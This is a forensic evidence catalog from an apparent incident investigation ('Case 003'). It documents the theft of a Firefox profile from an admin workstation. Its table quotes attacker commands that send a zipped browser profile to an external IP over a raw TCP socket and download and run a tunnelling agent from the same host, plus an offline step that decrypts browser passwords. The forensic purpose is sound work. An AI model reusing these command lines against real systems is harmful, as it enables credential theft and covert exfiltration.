# Case 003 — Evidentiary Artifacts Catalog

This catalog documents all forensic evidence items collected, normalized, and evaluated during the investigation of Case 003.

---

## 1. Structured Evidence Table

| Evidence ID | Producing Source | Detection / Event Class | Normalized Telemetry Observation | Evidence Classification | Supports Hypothesis |
| :--- | :--- | :--- | :--- | :---: | :---: |
| **E20** | `IT-ADMIN01` (Sysmon) | `A06` (Event ID 1) | `destinationProcessName="xcopy.exe"`, `deviceCustomString4="xcopy ... Firefox\Profiles\..."`. Target directory: `C:\Users\Public\firefox_profile\`. | `DIRECT` | H1 |
| **E21** | `IT-ADMIN01` (PowerShell) | `A07` (Event ID 4104) | ScriptBlock 4104: `Compress-Archive -Path "C:\Users\Public\firefox_profile\*" -DestinationPath "...\firefox_profile.zip"`. | `DIRECT` | H2 |
| **E22** | `IT-ADMIN01` (PowerShell) | `A07` (Event ID 4104) | ScriptBlock 4104: `New-Object System.Net.Sockets.TcpClient("203.0.113.25", 9999)` writing byte buffer. | `DIRECT` | H2 |
| **E23** | `ZEEK-SENSOR01` | `A07` (`conn.log`) | Zeek TCP flow: `10.10.35.18` $\rightarrow$ `203.0.113.25:9999`, `duration=4.2s`, `orig_bytes=1482109` (~1.48 MB). | `DIRECT` | H2 |
| **E24** | `IT-ADMIN01` (PowerShell) | `A08` (Event ID 4104) | ScriptBlock 4104: `Invoke-WebRequest -Uri "http://203.0.113.25:8080/agent.exe" -OutFile "C:\Users\Public\agent.exe"`. | `DIRECT` | H3 |
| **E25** | `IT-ADMIN01` (Sysmon) | `A08` (Event ID 1 & 3) | `agent.exe -connect 203.0.113.25:11601 -ignore-cert`. Established outbound connection on TCP/11601. | `DIRECT` | H3 |
| **E26** | Offline Decryption | Cryptographic Recovery | Plaintext recovery of username `thanh` and password using `firefox_decrypt` on Kali. | `UNVERIFIED` (Internal Telemetry) / `INFERRED` | H4 |

---

## 2. Evidence Assessment Summary
* **Total Direct Evidentiary Artifacts**: 6 (`E20`, `E21`, `E22`, `E23`, `E24`, `E25`).
* **Total Inferred / Unverified Artifacts**: 1 (`E26`).
* **Key Finding**: Telemetry provides complete, unbroken proof of the collection, packaging, and transmission of browser profile data, but offline decryption of password contents is confirmed only through downstream adversary actions in Case 004.
